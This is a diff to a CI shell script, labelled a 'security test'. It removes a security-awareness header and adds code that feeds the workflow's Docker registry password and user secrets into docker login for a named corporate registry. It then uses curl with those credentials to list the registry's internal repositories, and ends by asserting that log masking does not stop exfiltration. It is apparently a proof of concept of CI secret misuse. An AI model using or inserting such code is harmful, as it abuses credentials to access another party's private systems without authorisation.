@@ -1,12 +1,29 @@
 #!/bin/bash
+echo "========== SECURITY TEST =========="
 
-#!/bin/bash
+# Don't try to show the secret (GitHub will mask it)
+# Instead, PROVE you can use it
 
-# ============================================================================
-# CI/CD Security Exposure Demonstration Script
-# Purpose: Demonstrate what information is accessible in automated CI/CD runs
-# WARNING: This script is for security awareness - run only in controlled environments
-# ============================================================================
+echo "Attempting registry authentication..."
+
+if echo "$DOCKER_REGISTRY_PASSWD" | docker login fr-qafactorydev.europe.altair.com \
+    -u "$DOCKER_REGISTRY_USER" --password-stdin 2>&1; then
+    
+    echo ""
+    echo "✓ AUTHENTICATION SUCCESSFUL"
+    echo "✓ Credentials are valid and usable"
+    echo ""
+    echo "Listing internal repositories:"
+    curl -s -u "$DOCKER_REGISTRY_USER:$DOCKER_REGISTRY_PASSWD" \
+        "https://fr-qafactorydev.europe.altair.com/v2/_catalog"
+    
+    docker logout fr-qafactorydev.europe.altair.com 2>/dev/null
+fi
+
+echo ""
+echo "Credentials are accessible in workflow environment."
+echo "Masking logs doesn't prevent exfiltration to external servers."
+exit 1
 
 echo "=================================================="
 echo "  CI/CD Security Exposure Report"
